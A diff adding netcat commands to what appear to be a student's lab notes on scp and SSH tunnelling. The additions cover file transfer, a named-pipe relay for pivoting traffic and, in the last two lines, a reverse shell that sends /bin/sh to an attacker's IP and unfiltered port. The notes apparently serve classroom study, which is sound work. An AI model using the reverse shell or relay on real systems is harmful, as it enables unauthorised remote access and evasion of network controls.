@@ -13,3 +13,15 @@ scp -P 1111 student@172.16.82.106:secretstuff.txt /home/stud (Download remote di
 scp -P 1111 secretstuff.txt student@172.16.82.106:/home/student (Upload local directory to remote directory)
 ssh student@172.16.82.106 -L 1111:localhost:22 -NT (Download file from Remote to Local)
 scp -P 1111 secretstuff.txt student@localhost:/home/student
+
+NETCAT - TCP/UDP,
+nc 10.2.0.2 9001 < file.txt (client sends file)
+nc -l -p 9001 >newfile.txt ( Listener receives file)
+
+mknod mypipe p
+nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe (Client Relay) (Allows forwards and backwards traffic)
+On Listener 2 - nc -l -p 9002 < infile.txt
+Listener 1 - nc -l -p 9001 > outfile.txt
+
+nc -c /bin/sh <your ip> <any unfiltered port>
+nc -l -p <same unfiltered port> -vvv
